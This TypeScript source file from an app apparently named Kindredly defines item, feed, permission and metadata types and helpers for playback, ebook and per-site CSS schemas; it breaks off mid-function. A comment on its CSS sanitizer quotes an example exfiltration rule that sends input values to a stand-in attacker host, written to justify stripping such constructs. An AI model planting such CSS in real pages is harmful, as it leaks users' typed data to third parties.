/**
 * Item, collection, and metadata types
 */

import type { ItemResourceType } from '../constants';
import type { ItemTypePrimary, ItemTypeSecondary, TagOptionDetail } from '../content.types';
import type Item from '../schemas/public/Item';
import { ActivityContentInfo, MatchResult } from './activity.types';
import type { RecognizedPageInfo } from '../page-recognition.utils';
import type { DateString, Modify } from './common.types';
import type { EncInfo } from './encryption.types';
import type { FilePreview } from './file.types';
import type { UserType } from './user.types';

// Re-export Item schema
export type { Item };

export enum ItemTypeEnum {
  collection = 'col',
  link = 'link',
  note = 'note',
  file_group = 'file_group',
  file = 'file_group',
  default = 'default',
  thing = 'thing',
  tab = 'tab',
}


export enum PermissionType {
  owner = 'owner',
  editor = 'editor',
  viewer = 'viewer',
}

export const PermissionTypeList = [PermissionType.owner, PermissionType.editor, PermissionType.viewer];
export const PermissionTypeEditableList = [PermissionType.owner, PermissionType.editor];

export interface ItemPermissionDetails {
  userId: string;
  itemId: string;
  username?: string;
  permission: PermissionType;
  sharedByUserId?: string;
  /**
   * When true, user has permission but the item should not be listed in their library.
   * (This is orthogonal to access.)
   */
  notInLibrary?: boolean;
  direct?: boolean;
  inheritedFrom?: Array<string>;
  inheritedFromUsers?: Array<string>;
}

export interface PathTreeNode { item: Item; others: Item[]; earlyEnd: boolean }

export interface ItemRelationshipInfo {
  parents: ItemInfoView[];
  children: ItemInfoView[];
}

export interface ItemMetaExtracted {
  pageType: ItemResourceType | null;
  youtubeChannelIds?: string[];
  videoId?: string | null;
  channelId?: string | null;
  handleId?: string | null;
  /** The YouTube channel's display name, when the page or API named it. */
  channelName?: string | null;
  discoveredFeedLinks?: ExtractedFeedLink[];
  message?: string | null;
  /**
   * Which extractor produced this metadata. The `pdf_*` / `file_*` ids mark a URL
   * that serves a file: `pdf_landing_page` came from the publisher's abstract page,
   * `pdf_embedded` from the PDF's own XMP/Info dictionary, `file_name` from the
   * filename, and `file_headers` from the response headers alone (no title found).
   */
  sourceId?:
    | 'yt_api'
    | 'parser_1'
    | 'parser_err'
    | 'html_parser'
    | 'published'
    | 'published_curated'
    | 'oembed'
    | 'live_dom'
    | 'pdf_landing_page'
    | 'pdf_embedded'
    | 'file_name'
    | 'file_headers';
  redditScore?: number;
  redditComments?: number;
  redditSubreddit?: string;
  redditAuthor?: string;
  redditCreated?: number;

  /**
   * Optional richer page recognition output (provider + resourceType + ids).
   * This is additive and should not change existing behavior unless callers opt in.
   */
  recognized?: RecognizedPageInfo;
}

export interface ExtractedFeedLink {
  url: string;
  title?: string;
  type?: 'rss' | 'atom' | 'json' | 'other';
  /** Where the link was found: a <head> alternate/feed declaration vs a body anchor. */
  source?: 'head' | 'anchor';
}

export interface ItemMeta {
  url?: string;
  keywords?: string;
  siteName?: string;
  type?: string;
  locale?: string;
  favicon?: string;
  faviconSrcPath?: string;
  
  tsManifest?: Record<string, any>;
  title?: string;
  description?: string;
  faviconPath?: string;
  bannerImagePath?: string;
  bannerImageSrcPath?: string;
  /** Explicit background banner for the collection header cover strip (catalog filename or uf_ user file). */
  bgBannerFilename?: string;
  imageSrc?: string;
  tsExtractedInfo?: ItemMetaExtracted;

  // Feed-authoring metadata (subscribable feeds). See docs/guides/feed-content-standard.md.
  /** Theme/series slug this post was authored under. */
  seedTheme?: string;
  /** Series this post belongs to within a topic feed. */
  series?: string;
  /** Depth-layer marker (>0 = a "go deeper" tangent, filtered out of the main sequence). */
  depth?: number;
  /** For a depth post: the easyId of the parent post it hangs under. */
  parentKey?: string;

  /**
   * Set when the URL serves a file rather than a page (a PDF, a zip, a direct
   * image). Present means "the popup may offer to include this file"; absent means
   * an ordinary page. Cached alongside the rest of the metadata so recognising a
   * file costs no extra request after the first lookup.
   */
  fileInfo?: ItemMetaFileInfo;

  resolved?: boolean;
}

/** What a file URL is, as far as saving it is concerned. */
export interface ItemMetaFileInfo {
  kind: 'file';
  /** Response `Content-Type`, normalized and without parameters (e.g. `application/pdf`). */
  contentType: string;
  /** From `Content-Disposition`, else the last URL path segment. */
  filename: string | null;
  /** From `Content-Length`; null when the server did not declare one. */
  sizeBytes: number | null;
}

export interface ItemFeedbackView {
  _id?: string;
  userId?: string | null;
  data?: unknown | null;
  isReadLaterDate?: DateString;
  starredDate?: DateString;
  isReadDate?: DateString;
  isHidden?: boolean;
  reactionDate?: DateString;
  reaction?: string;
  archivedDate?: DateString;
  snoozeUntilDate?: DateString;
  /** Hidden from Rediscover. */
  neverRemindDate?: DateString;
  /** Kept out of Library Cleanup. Its own flag: keeping is not the same intent as hiding. */
  keepFromCleanupDate?: DateString;
  notes?: unknown | null;
  visitCount?: number | null;
  visitTime?: DateString;
  updatedAt?: DateString;
  lastVisit?: DateString;
  createdAt?: DateString;
}

export interface ItemAttachment {
  id?: string;
  type: 'file' | 'snapshot' | 'snip' | 'uri';
  filename?: string;
  fileType: string;
  fileId?: string;
  info?: Record<string, any>;
  meta?: Record<string, any>;
  previews?: FilePreview[];
  encryptedInfo?: boolean;
  createDate?: number;
}

export type FeedType = 'pub_col' | 'rss' | 'atom' | 'json' | 'other';

export type FeedMediaKind = 'audio';

export interface ItemFeed {
  feedId: string;
  type: FeedType;
  title: string;
  mediaKind?: FeedMediaKind;
  description?: string;
  config?: {
    pubId?: string;
  };
  url?: string;
  feedURL?: string;
}

export interface AdditionalLink {
  id: string;
  title: string;
  url: string;
  type?: string;
  /**
   * How much of this link's address the item claims. A link grants access to
   * whatever it matches, so this is the difference between "the sign-in page" and
   * "the whole booking platform".
   *
   * Absent means "not chosen yet" — `inferLinkScope` decides at derive time, which
   * is what carries links saved before this field existed.
   */
  scope?: UrlScopeKind;
}

/**
 * How much of a URL an item claims.
 *
 * - `specific` — that page and what sits under it
 * - `site` — that hostname
 * - `domain` — that registrable domain and every subdomain
 *
 * Shared with `ItemDetailsInfo.accessScopeKind`, which says the same thing about
 * the item's own `url`.
 */
export type UrlScopeKind = 'specific' | 'site' | 'domain';

export interface PublishedExternalLookupInfo {
  resourceType?: ItemResourceType | string;
  ageRestricted?: boolean;
  madeForKids?: boolean;
  categoryIds?: string[];
  contentRatingDetails?: unknown;
  source?: string;
  rawData?: unknown;
  extendedInfo?: Record<string, unknown> | null;
}

export type PostImportProcessingState =
  | 'pending_metadata'
  | 'fetching_assets'
  | 'verification_pending'
  | 'classification_pending'
  | 'ready'
  | 'approved'
  | 'failed'
  | 'needs_review';

export interface PostImportProcessingInfo {
  state: PostImportProcessingState;
  source: 'admin_content_loader' | string;
  updatedAt: string;
  importedAt?: string;
  lastRequestedAt?: string;
  lastCompletedAt?: string;
  lastAttemptMessage?: string | null;
  lastError?: string | null;
  batchId?: string;
  batchLabel?: string | null;
  batchSource?: 'manifest' | 'package' | string;
}

/**
 * Only link-like records with a real http(s) source URL have metadata to fetch.
 * Collections and items without a fetchable URL have nothing to pull, so they
 * skip the metadata stage and land 'ready' (still subject to curation/approval)
 * instead of getting stuck in the "needs metadata" queue.
 */
export function importRecordHasFetchableUrl(
  type: string | null | undefined,
  url: string | null | undefined,
): boolean {
  if (type !== 'thing' && type !== 'link') return false;
  return typeof url === 'string' && /^https?:\/\//i.test(url.trim());
}

export function initialImportProcessingState(
  type: string | null | undefined,
  url: string | null | undefined,
): Extract<PostImportProcessingState, 'pending_metadata' | 'ready'> {
  return importRecordHasFetchableUrl(type, url) ? 'pending_metadata' : 'ready';
}

export const PLAYBACK_SCHEMA_ID = 'kindredly.playback.v1';

export const MEDIA_REF_SCHEMA_ID = 'kindredly.mediaRef.v1';

export const EBOOK_READER_SCHEMA_ID = 'kindredly.ebookReader.v1';

export const PARENT_SOURCE_SCHEMA_ID = 'kindredly.parentSource.v1';

export const SITE_STYLE_SCHEMA_ID = 'kindredly.siteStyle.v1';

export type MediaRefKind = 'image' | 'video' | 'file';

export interface MediaRefSchemaV1 {
  schemaVersion: 1;
  attachmentId: string;
  kind: MediaRefKind;
  mimeType?: string;
  previewAttachmentId?: string | null;
}

export interface PlaybackSchemaV1 {
  schemaVersion: 1;
  mediaKind: 'audio';
  playableKind: 'podcast_episode';
  audioUrl: string;
  audioType?: string;
  audioDuration?: string;
  sourceUrl?: string;
  artworkUrl?: string;
  title?: string;
}

export interface EbookReaderSchemaV1 {
  schemaVersion: 1;
  downloadUrl?: string;
}

export type ParentSourceSavedItemType = 'feed_item' | 'pub_item';

export interface ParentSourceSchemaV1 {
  schemaVersion: 1;
  sourceKind: 'subscription';
  savedFromItemType: ParentSourceSavedItemType;
  subscriptionId?: string;
  subscriptionRefType?: string;
  subscriptionRefId?: string;
  feedId?: string;
  feedURL?: string;
  parentItemId?: string;
  parentItemUrl?: string;
  parentTitle?: string;
  parentSubtitle?: string;
  channelId?: string;
}

/**
 * Custom per-site CSS carried on the item itself, so it encrypts, syncs, and travels
 * with the item when it is published. Applied on top of the shipped hostname defaults
 * that `SentryProcessor` already routes — never in place of them.
 */
export type SiteStyleCategory = 'safety' | 'usability';

/**
 * Which surfaces an entry applies to. A site's mobile layout is usually a different
 * DOM from its desktop one, so the same cleanup often needs two stylesheets. Entries
 * are deduped on `id` + `surface`, letting one id carry a variant per surface.
 */
export type SiteStyleSurface = 'all' | 'mobile' | 'desktop';

/** A superseded version of an entry's CSS, kept so a bad edit can be undone. */
export interface SiteStyleRevisionV1 {
  version: number;
  css: string;
  /** Epoch ms. Absolute, because a relative age is meaningless once stored. */
  savedAt: number;
  /** What produced it, so an agent edit can be told from a hand edit. */
  source: 'manual' | 'agent';
}

export interface SiteStyleEntryV1 {
  id: string;
  label: string;
  css: string;
  category: SiteStyleCategory;
  surface: SiteStyleSurface;
  enabled: boolean;
  /** Bumped on every save so a stale entry can be told from a current one. */
  version: number;
  /**
   * Prior versions, newest last, capped at {@link SITE_STYLE_MAX_REVISIONS}. Editing a
   * site's CSS is guesswork against a DOM nobody controls, so the previous version being
   * one click away is what makes trying an edit cheap.
   */
  revisions?: SiteStyleRevisionV1[];
}

export interface SiteStyleSchemaV1 {
  schemaVersion: 1;
  entries: SiteStyleEntryV1[];
}

/** A published item carries its CSS to other families, so the payload is bounded. */
export const SITE_STYLE_MAX_ENTRIES = 20;
export const SITE_STYLE_MAX_CSS_LENGTH = 40000;
/** Enough to walk back a bad editing session; the payload rides inside the item. */
export const SITE_STYLE_MAX_REVISIONS = 10;

function normalizePlaybackString(value: unknown): string | undefined {
  if (typeof value !== 'string') return undefined;
  const trimmed = value.trim();
  return trimmed || undefined;
}

function normalizeMediaRefString(value: unknown): string | undefined {
  if (typeof value !== 'string') return undefined;
  const trimmed = value.trim();
  return trimmed || undefined;
}

function normalizeEbookUrl(value: unknown): string | undefined {
  if (typeof value !== 'string') return undefined;
  const trimmed = value.trim();
  if (!trimmed || !/^https?:\/\//i.test(trimmed)) return undefined;
  return trimmed;
}

function normalizeParentSourceString(value: unknown): string | undefined {
  if (typeof value !== 'string') return undefined;
  const trimmed = value.trim();
  return trimmed || undefined;
}

export function createPlaybackSchemaV1(data: {
  audioUrl?: string | null;
  audioType?: string | null;
  audioDuration?: string | null;
  sourceUrl?: string | null;
  artworkUrl?: string | null;
  title?: string | null;
}): PlaybackSchemaV1 | null {
  const audioUrl = normalizePlaybackString(data.audioUrl);
  if (!audioUrl) return null;

  const schema: PlaybackSchemaV1 = {
    schemaVersion: 1,
    mediaKind: 'audio',
    playableKind: 'podcast_episode',
    audioUrl,
  };

  const audioType = normalizePlaybackString(data.audioType);
  if (audioType) schema.audioType = audioType;

  const audioDuration = normalizePlaybackString(data.audioDuration);
  if (audioDuration) schema.audioDuration = audioDuration;

  const sourceUrl = normalizePlaybackString(data.sourceUrl);
  if (sourceUrl) schema.sourceUrl = sourceUrl;

  const artworkUrl = normalizePlaybackString(data.artworkUrl);
  if (artworkUrl) schema.artworkUrl = artworkUrl;

  const title = normalizePlaybackString(data.title);
  if (title) schema.title = title;

  return schema;
}

export function createParentSourceSchemaV1(data: {
  savedFromItemType?: ParentSourceSavedItemType | null;
  subscriptionId?: string | null;
  subscriptionRefType?: string | null;
  subscriptionRefId?: string | null;
  feedId?: string | null;
  feedURL?: string | null;
  parentItemId?: string | null;
  parentItemUrl?: string | null;
  parentTitle?: string | null;
  parentSubtitle?: string | null;
  channelId?: string | null;
}): ParentSourceSchemaV1 | null {
  const savedFromItemType =
    data.savedFromItemType === 'feed_item' || data.savedFromItemType === 'pub_item'
      ? data.savedFromItemType
      : null;
  if (!savedFromItemType) return null;

  const subscriptionId = normalizeParentSourceString(data.subscriptionId);
  const subscriptionRefType = normalizeParentSourceString(data.subscriptionRefType);
  const subscriptionRefId = normalizeParentSourceString(data.subscriptionRefId);
  const feedId = normalizeParentSourceString(data.feedId);
  const feedURL = normalizeParentSourceString(data.feedURL);
  const parentItemId = normalizeParentSourceString(data.parentItemId);
  const parentItemUrl = normalizeParentSourceString(data.parentItemUrl);
  const parentTitle = normalizeParentSourceString(data.parentTitle);
  const parentSubtitle = normalizeParentSourceString(data.parentSubtitle);
  const channelId = normalizeParentSourceString(data.channelId);

  const hasUsefulReference =
    !!subscriptionId ||
    !!feedURL ||
    !!parentItemId ||
    !!parentItemUrl ||
    (!!subscriptionRefType && !!subscriptionRefId);

  if (!hasUsefulReference) return null;

  const schema: ParentSourceSchemaV1 = {
    schemaVersion: 1,
    sourceKind: 'subscription',
    savedFromItemType,
  };

  if (subscriptionId) schema.subscriptionId = subscriptionId;
  if (subscriptionRefType) schema.subscriptionRefType = subscriptionRefType;
  if (subscriptionRefId) schema.subscriptionRefId = subscriptionRefId;
  if (feedId) schema.feedId = feedId;
  if (feedURL) schema.feedURL = feedURL;
  if (parentItemId) schema.parentItemId = parentItemId;
  if (parentItemUrl) schema.parentItemUrl = parentItemUrl;
  if (parentTitle) schema.parentTitle = parentTitle;
  if (parentSubtitle) schema.parentSubtitle = parentSubtitle;
  if (channelId) schema.channelId = channelId;

  return schema;
}

/**
 * Strips constructs that let a stylesheet reach the network. This matters because a
 * published item carries its CSS to other families: `input[value^="a"] { background:
 * url(//attacker/a) }` turns a stylesheet into an exfiltration channel, and `@import`
 * both leaks the visit and pulls in rules nobody reviewed. `data:` URIs stay — they
 * render without a request.
 */
export function sanitizeSiteStyleCss(value: unknown): string {
  if (typeof value !== 'string') return '';

  return value
    // Whole @import at-rule, quoted or url() form.
    .replace(/@import\b[^;]*;?/gi, '')
    // url(...) unless it is a data: URI.
    .replace(/url\(\s*(['"]?)(?!data:)[^)]*\1\s*\)/gi, 'none')
    // Long-dead engine hooks that executed script from CSS.
    .replace(/expression\s*\(/gi, 'none(')
    .replace(/-moz-binding\s*:/gi, '--blocked-binding:')
    .replace(/\bbehavior\s*:/gi, '--blocked-behavior:')
    .slice(0, SITE_STYLE_MAX_CSS_LENGTH);
}

function normalizeSiteStyleId(value: unknown): string {
  if (typeof value !== 'string') return '';
  return value
    .trim()
    .toLowerCase()
    .replace(/[^a-z0-9-]+/g, '-')
    .replace(/^-+|-+$/g, '')
    .slice(0, 64);
}

export function createSiteStyleEntryV1(data: {
  id?: string | null;
  label?: string | null;
  css?: string | null;
  category?: string | null;
  surface?: string | null;
  enabled?: boolean | null;
  version?: number | null;
  revisions?: Array<{ version?: number; css?: string; savedAt?: number; source?: string }> | null;
}): SiteStyleEntryV1 | null {
  const id = normalizeSiteStyleId(data.id);
  if (!id) return null;

  const css = sanitizeSiteStyleCss(data.css);
  if (!css.trim()) return null;

  const label = typeof data.label === 'string' && data.label.trim()
    ? data.label.trim().slice(0, 120)
    : id;

  const version =
    typeof data.version === 'number' && Number.isFinite(data.version) && data.version > 0
      ? Math.floor(data.version)
      : 1;

  const revisions = Array.isArray(data.revisions)
    ? data.revisions
        .map((r) => {
          const revCss = sanitizeSiteStyleCss(r?.css);
          const revVersion = typeof r?.version === 'number' && r.version > 0 ? Math.floor(r.version) : 0;
          if (!revCss.trim() || !revVersion) return null;
          return {
            version: revVersion,
            css: revCss,
            savedAt: typeof r?.savedAt === 'number' && r.savedAt > 0 ? r.savedAt : 0,
            source: r?.source === 'agent' ? ('agent' as const) : ('manual' as const),
          };
        })
        .filter((r): r is SiteStyleRevisionV1 => r !== null)
        .slice(-SITE_STYLE_MAX_REVISIONS)
    : [];

  return {
    id,
    label,
    css,
    // Anything unrecognized is treated as usability, which defaults off for everyone.
    category: data.category === 'safety' ? 'safety' : 'usability',
    // Unrecognized means 'all' — an entry authored before surfaces existed applies
    // everywhere, which is what it did before.
    surface: data.surface === 'mobile' || data.surface === 'desktop' ? data.surface : 'all',
    enabled: data.enabled !== false,
    version,
    ...(revisions.length ? { revisions } : {}),
  };
}

/**
 * Saves new CSS onto an entry, pushing what was there into `revisions`.
 *
 * Returns the entry unchanged when the CSS did not actually change — otherwise every
 * open-and-close of an editor would burn a revision slot and push a real prior version
 * out of the window.
 */
export function withUpdatedSiteStyleCss(
  entry: SiteStyleEntryV1,
  nextCss: string,
  source: 'manual' | 'agent' = 'manual',
): SiteStyleEntryV1 {
  const sanitized = sanitizeSiteStyleCss(nextCss);
  if (!sanitized.trim() || sanitized === entry.css) return entry;

  const revisions = [
    ...(entry.revisions || []),
    { version: entry.version, css: entry.css, savedAt: Date.now(), source },
  ].slice(-SITE_STYLE_MAX_REVISIONS);

  return { ...entry, css: sanitized, version: entry.version + 1, revisions };
}

/**
 * Restores a prior version. The version being replaced is itself pushed onto the stack,
 * so reverting is undoable rather than destructive.
 */
export function revertSiteStyleEntry(
  entry: SiteStyleEntryV1,
  targetVersion: number,
): SiteStyleEntryV1 {
  const target = (entry.revisions || []).find((r) => r.version === targetVersion);
  if (!target) return entry;

  return withUpdatedSiteStyleCss(entry, target.css, 'manual');
}

/**
 * The entries that apply on the device doing the asking. A surface-specific entry wins
 * over an `all` entry sharing its id, so an author can ship a general stylesheet and
 * override it for one surface without duplicating the rest.
 */
export function selectSiteStyleEntriesForSurface(
  entries: SiteStyleEntryV1[] | null | undefined,
  surface: 'mobile' | 'desktop',
): SiteStyleEntryV1[] {
  if (!Array.isArray(entries)) return [];

  const applicable = entries.filter((e) => e.surface === 'all' || e.surface === surface);
  const specific = new Set(applicable.filter((e) => e.surface === surface).map((e) => e.id));

  return applicable.filter((e) => e.surface === surface || !specific.has(e.id));
}

export function createSiteStyleSchemaV1(
  entries: Array<Parameters<typeof createSiteStyleEntryV1>[0]> | null | undefined,
): SiteStyleSchemaV1 | null {
  if (!Array.isArray(entries)) return null;

  const seen = new Set<string>();
  const normalized: SiteStyleEntryV1[] = [];

  for (const candidate of entries) {
    if (normalized.length >= SITE_STYLE_MAX_ENTRIES) break;
    const entry = createSiteStyleEntryV1(candidate || {});
    // Keyed on id + surface: one id may carry a desktop and a mobile variant.
    const key = entry ? `${entry.id}::${entry.surface}` : '';
    if (!entry || seen.has(key)) continue;
    seen.add(key);
    normalized.push(entry);
  }

  if (!normalized.length) return null;

  return { schemaVersion: 1, entries: normalized };
}

export function createMediaRefSchemaV1(data: {
  attachmentId?: string | null;
  kind?: MediaRefKind | null;
  mimeType?: string | null;
  previewAttachmentId?: string | null;
}): MediaRefSchemaV1 | null {
  const attachmentId = normalizeMediaRefString(data.attachmentId);
  if (!attachmentId) return null;

  const kind = data.kind;
  if (kind !== 'image' && kind !== 'video' && kind !== 'file') return null;

  const schema: MediaRefSchemaV1 = {
    schemaVersion: 1,
    attachmentId,
    kind,
  };

  const mimeType = normalizeMediaRefString(data.mimeType);
  if (mimeType) schema.mimeType = mimeType;

  const previewAttachmentId = normalizeMediaRefString(data.previewAttachmentId);
  if (previewAttachmentId) schema.previewAttachmentId = previewAttachmentId;

  return schema;
}

export interface ItemBaseView {
  _id?: string;
  name?: string | null;
  description?: string | null;
  url?: string | null;
  type?: ItemTypePrimary | null;
  subType?: ItemTypeSecondary | null;
}

export interface ItemDetailsInfo {
  additionalLinks?: AdditionalLink[];
  feeds?: ItemFeed[];
  hasFeeds?: boolean;
  value?: string;
  editor?: string;
  accessScopeKind?: UrlScopeKind;

  /**
   * Shared published-content lookup hints used by metadata/cache flows.
   * Legacy compatibility reads may still check older locations, but new writes
   * should prefer this field.
   */
  externalLookup?: PublishedExternalLookupInfo;

  /**
   * System-owned state for post-import processing after persistence.
   */
  postImportProcessing?: PostImportProcessingInfo;

  /**
   * Namespaced schema payloads for extensible item info.
   * Stored inside encrypted `info` so the server remains schema-agnostic.
   */
  schemas?: Record<string, unknown>;

  /**
   * @deprecated Legacy single-bucket schema payload.
   * Prefer `schemas[schemaId]`.
   */
  schemaData?: Record<string, unknown>;
}

export function setPlaybackSchemaOnInfo(
  info: ItemDetailsInfo | null | undefined,
  schema: PlaybackSchemaV1,
): ItemDetailsInfo {
  const schemas =
    info?.schemas && typeof info.schemas === 'object' && !Array.isArray(info.schemas)
      ? info.schemas
      : {};

  return {
    ...(info || {}),
    schemas: {
      ...schemas,
      [PLAYBACK_SCHEMA_ID]: schema,
    },
  };
}

export function setParentSourceSchemaOnInfo(
  info: ItemDetailsInfo | null | undefined,
  schema: ParentSourceSchemaV1,
): ItemDetailsInfo {
  const schemas =
    info?.schemas && typeof info.schemas === 'object' && !Array.isArray(info.schemas)
      ? info.schemas
      : {};

  return {
    ...(info || {}),
    schemas: {
      ...schemas,
      [PARENT_SOURCE_SCHEMA_ID]: schema,
    },
  };
}

export function setSiteStyleSchemaOnInfo(
  info: ItemDetailsInfo | null | undefined,
  schema: SiteStyleSchemaV1,
): ItemDetailsInfo {
  const schemas =
    info?.schemas && typeof info.schemas === 'object' && !Array.isArray(info.schemas)
      ? info.schemas
      : {};

  return {
    ...(info || {}),
    schemas: {
      ...schemas,
      [SITE_STYLE_SCHEMA_ID]: schema,
    },
  };
}

export function setMediaRefSchemaOnInfo(
  info: ItemDetailsInfo | null | undefined,
  schema: MediaRefSchemaV1,
): ItemDetailsInfo {
  const schemas =
    info?.schemas && typeof info.schemas === 'object' && !Array.isArray(info.schemas)
      ? info.schemas
      : {};

  return {
    ...(info || {}),
    schemas: {
      ...schemas,
      [MEDIA_REF_SCHEMA_ID]: schema,
    },
  };
}

export function clearMediaRefSchemaOnInfo(
  info: ItemDetailsInfo | null | undefined,
): ItemDetailsInfo {
  const schemas =
    info?.schemas && typeof info.schemas === 'object' && !Array.isArray(info.schemas)
      ? { ...info.schemas }
      : {};

  delete schemas[MEDIA_REF_SCHEMA_ID];

  return {
    ...(info || {}),
    schemas,
  };
}

export function setPublishedExternalLookupOnInfo(
  info: ItemDetailsInfo | null | undefined,
  externalLookup: PublishedExternalLookupInfo | null | undefined,
): ItemDetailsInfo {
  if (!externalLookup) {
    return {
      ...(info || {}),
    };
  }

  return {
    ...(info || {}),
    externalLookup: {
      ...(info?.externalLookup || {}),
      ...externalLookup,
    },
  };
}

export function setPostImportProcessingOnInfo(
  info: ItemDetailsInfo | null | undefined,
  processing: PostImportProcessingInfo | null | undefined,
): ItemDetailsInfo {
  if (!processing) {
    return {
      ...(info || {}),
    };
  }

  return {
    ...(info || {}),
    postImportProcessing: {
      ...(info?.postImportProcessing || {}),
      ...processing,
    },
  };
}

function asLookupRecord(value: unknown): Record<string, unknown> | null {
  if (!value || typeof value !== 'object' || Array.isArray(value)) {
    return null;
  }

  return value as Record<string, unknown>;
}

function unwrapPublishedLookupCandidate(value: unknown): Record<string, unknown> | null {
  const record = asLookupRecord(value);
  if (!record) return null;

  return asLookupRecord(record.extendedInfo) || record;
}

export function getCanonicalPublishedExternalLookupCandidate(source: {
  info?: ItemDetailsInfo | null;
  sourceInfo?: unknown;
  sysInfo?: unknown;
  meta?: ItemMeta | null;
  details?: {
    info?: ItemDetailsInfo | null;
    sourceInfo?: unknown;
    sysInfo?: unknown;
    meta?: ItemMeta | null;
  } | null;
} | null | undefined): Record<string, unknown> | null {
  const info = source?.info || source?.details?.info || null;

  return unwrapPublishedLookupCandidate(info?.externalLookup);
}

export function getLegacyPublishedExternalLookupCandidates(source: {
  info?: ItemDetailsInfo | null;
  sourceInfo?: unknown;
  sysInfo?: unknown;
  meta?: ItemMeta | null;
  details?: {
    info?: ItemDetailsInfo | null;
    sourceInfo?: unknown;
    sysInfo?: unknown;
    meta?: ItemMeta | null;
  } | null;
} | null | undefined): Record<string, unknown>[] {
  const info = source?.info || source?.details?.info || null;
  const sourceInfo = asLookupRecord(source?.sourceInfo || source?.details?.sourceInfo);
  const sysInfo = asLookupRecord(source?.sysInfo || source?.details?.sysInfo);
  const manifestInfo = asLookupRecord(source?.meta?.tsManifest || source?.details?.meta?.tsManifest);
  const infoCompat = info ? (info as Record<string, unknown>) : null;

  return [
    unwrapPublishedLookupCandidate(infoCompat?.externalMeta),
    unwrapPublishedLookupCandidate(infoCompat?.resourceHints),
    unwrapPublishedLookupCandidate(sourceInfo?.externalLookup),
    unwrapPublishedLookupCandidate(sourceInfo?.externalMeta),
    unwrapPublishedLookupCandidate(sysInfo?.externalLookup),
    unwrapPublishedLookupCandidate(sysInfo?.externalMeta),
    unwrapPublishedLookupCandidate(manifestInfo?.externalLookup),
    unwrapPublishedLookupCandidate(manifestInfo?.externalMeta),
    unwrapPublishedLookupCandidate(manifestInfo?.resourceHints),
  ].filter((candidate): candidate is Record<string, unknown> => !!candidate);
}

export function getPlaybackSchemaV1(source: {
  info?: ItemDetailsInfo | null;
  details?: { info?: ItemDetailsInfo | null } | null;
} | null | undefined): PlaybackSchemaV1 | null {
  const raw =
    source?.info?.schemas?.[PLAYBACK_SCHEMA_ID] ||
    source?.details?.info?.schemas?.[PLAYBACK_SCHEMA_ID];

  if (!raw || typeof raw !== 'object' || Array.isArray(raw)) return null;

  const schema = raw as Partial<PlaybackSchemaV1>;
  if (schema.schemaVersion !== 1) return null;
  if (schema.mediaKind !== 'audio') return null;
  if (schema.playableKind !== 'podcast_episode') return null;

  const audioUrl = normalizePlaybackString(schema.audioUrl);
  if (!audioUrl) return null;

  return {
    schemaVersion: 1,
    mediaKind: 'audio',
    playableKind: 'podcast_episode',
    audioUrl,
    audioType: normalizePlaybackString(schema.audioType),
    audioDuration: normalizePlaybackString(schema.audioDuration),
    sourceUrl: normalizePlaybackString(schema.sourceUrl),
    artworkUrl: normalizePlaybackString(schema.artworkUrl),
    title: normalizePlaybackString(schema.title),
  };
}

export function getSiteStyleSchemaV1(source: {
  info?: ItemDetailsInfo | null;
  details?: { info?: ItemDetailsInfo | null } | null;
} | null | undefined): SiteStyleSchemaV1 | null {
  const raw =
    source?.info?.schemas?.[SITE_STYLE_SCHEMA_ID] ||
    source?.details?.info?.schemas?.[SITE_STYLE_SCHEMA_ID];

  if (!raw || typeof raw !== 'object' || Array.isArray(raw)) return null;

  const schema = raw as Partial<SiteStyleSchemaV1>;
  if (schema.schemaVersion !== 1) return null;

  // Re-normalize on read: stored payloads predate any later sanitizer change, and a
  // published item's CSS was authored by someone else.
  return createSiteStyleSchemaV1(schema.entries as SiteStyleEntryV1[] | undefined);
}

export function getParentSourceSchemaV1(source: {
  info?: ItemDetailsInfo | null;
  details?: { info?: ItemDetailsInfo | null } | null;
} | null | undefined): ParentSourceSchemaV1 | null {
  const raw =
    source?.info?.schemas?.[PARENT_SOURCE_SCHEMA_ID] ||
    source?.details?.info?.schemas?.[PARENT_SOURCE_SCHEMA_ID];

  if (!raw || typeof raw !== 'object' || Array.isArray(raw)) return null;

  const schema = raw as Partial<ParentSourceSchemaV1>;
  if (schema.schemaVersion !== 1) return null;
  if (schema.sourceKind !== 'subscription') return null;

  const savedFromItemType =
    schema.savedFromItemType === 'feed_item' || schema.savedFromItemType === 'pub_item'
      ? schema.savedFromItemType
      : null;
  if (!savedFromItemType) return null;

  const normalized = createParentSourceSchemaV1({
    savedFromItemType,
    subscriptionId: normalizeParentSourceString(schema.subscriptionId),
    subscriptionRefType: normalizeParentSourceString(schema.subscriptionRefType),
    subscriptionRefId: normalizeParentSourceString(schema.subscriptionRefId),
    feedId: normalizeParentSourceString(schema.feedId),
    feedURL: normalizeParentSourceString(schema.feedURL),
    parentItemId: normalizeParentSourceString(schema.parentItemId),
    parentItemUrl: normalizeParentSourceString(schema.parentItemUrl),
    parentTitle: normalizeParentSourceString(schema.parentTitle),
    parentSubtitle: normalizeParentSourceString(schema.parentSubtitle),
    channelId: normalizeParentSourceString(schema.channelId),
  });

  return normalized;
}

export function getEbookReaderSchemaV1(source: {
  info?: ItemDetailsInfo | null;
  details?: { info?: ItemDetailsInfo | null } | null;
} | null | undefined): EbookReaderSchemaV1 | null {
  const raw =
    source?.info?.schemas?.[EBOOK_READER_SCHEMA_ID] ||
    source?.details?.info?.schemas?.[EBOOK_READER_SCHEMA_ID];

  if (!raw || typeof raw !== 'object' || Array.isArray(raw)) return null;

  const schema = raw as Partial<EbookReaderSchemaV1>;
  if (schema.schemaVersion !== 1) return null;

  const downloadUrl = normalizeEbookUrl(schema.downloadUrl);
  if (!downloadUrl) return null;

  return {
    schemaVersion: 1,
    downloadUrl,
  };
}

export function getEbookDownloadUrl(source: {
  info?: ItemDetailsInfo | null;
  sourceInfo?: unknown;
  url?: string | null;
  details?: {
    info?: ItemDetailsInfo | null;
    sourceInfo?: unknown;
    url?: string | null;
  } | null;
} | null | undefined): string | null {
  const schemaUrl = getEbookReaderSchemaV1(source)?.downloadUrl;
  if (schemaUrl) return schemaUrl;

  const sourceInfo = asLookupRecord(source?.sourceInfo || source?.details?.sourceInfo);
  const legacyEbook = asLookupRecord(sourceInfo?.ebook);
  const legacyUrl = normalizeEbookUrl(legacyEbook?.downloadUrl);
  if (legacyUrl) return legacyUrl;

  return normalizeEbookUrl(source?.url || source?.details?.url) || null;
}

export function getConfiguredEbookDownloadUrl(source: {
  info?: ItemDetailsInfo | null;
  sourceInfo?: unknown;
  details?: {
    info?: ItemDetailsInfo | null;
    sourceInfo?: unknown;
  } | null;
} | null | undefined): string | null {
  const schemaUrl = getEbookReaderSchemaV1(source)?.downloadUrl;
